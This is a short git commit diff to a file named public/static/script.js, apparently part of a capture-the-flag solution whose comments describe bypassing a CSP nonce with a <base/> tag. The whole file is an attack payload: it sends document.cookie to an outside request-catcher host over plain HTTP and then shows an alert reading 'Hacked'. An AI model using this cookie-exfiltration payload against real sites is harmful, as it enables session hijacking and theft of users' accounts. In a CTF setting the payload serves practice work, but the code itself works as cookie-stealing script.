9419fd799ff008e8631276949baf040e9dab04a3
CX330Blake <timchen975@gmail.com>
2025-04-08 18:30:43 +0800

    Fix script

--- public/static/script.js
+++ public/static/script.js
@@ -1,4 +1,5 @@
 // This is for CTF challenge
 // <base/> bypass CSP nonce
-alert(1);
-fetch("https://cx330.requestcatcher.com/" + document.cookie);
+
+fetch("http://cx330.requestcatcher.com/" + document.cookie);
+alert("Hacked");
